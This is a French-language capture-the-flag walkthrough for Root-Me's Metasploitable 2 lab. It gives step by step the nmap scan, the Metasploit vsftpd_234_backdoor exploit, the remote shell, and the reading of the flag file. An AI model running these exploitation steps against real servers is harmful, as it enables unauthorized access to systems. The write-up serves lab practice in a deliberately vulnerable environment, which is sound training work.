
# CTF - Metasploitable 2
https://www.root-me.org/fr/Capture-The-Flag/CTF-all-the-day/Metasploitable-2-13?lang=fr
```
L'objectif est de trouver un flag de validation est stocké dans le fichier /passwd
```
<br>
Pour commencer, ouvrez votre os linux pour ma part j'utilise kali

Sur la page du CTF vous pourrez retrouvez votre environnement virtuel à attaquer sous la forme de ctfXX.root-me.org
Lancez ensuite un terminal et éxécutez
```
host ctfXX.root-me.org
```
Vous obtiendrez une réponse comme ceci<br>
IMAGE

Munissez vous ensuite de Zenmap et faites un scan de votre environnement ctfXX comme ceci <br>
IMAGE

ou sinon directement depuis nmap avec
```
nmap -T4 -A -v ctfXX.root-me.org
```
<br><br>
Dans la catégorie des Ports, on peut constater un port 21 ouvert avec comme version "vsftpd"
<br>
Lancez ensuite metasploit et faites une recherche avec 
```
search vsftpd
```
Vous retrouverez "exploit/unix/ftp/vsftpd_234_backdoor"<br><br>
Dans votre terminal entrez 
```
exploit/unix/ftp/vsftpd_234_backdoor
```
Puis confirmez par Y
<br>
Faites ensuite un check des options avec
```
show options
```

Comme vous pouvez le constater, les RHOSTS n'ont aucun host
Rentrez le vous même avec 
```
set rhost *l'adresse du host obtenue avec la commande "host ctfXX"
```

Vous pourrez ensuite effectuer un 
```
exploit
```
Ensuite un 
```
shell
```
Pour finir un 
```
ls
```
Et afin de vous rendre dans le répertoire où ce trouve le flag, soit passwd, faites
```
nano passwd
```

Bon courage !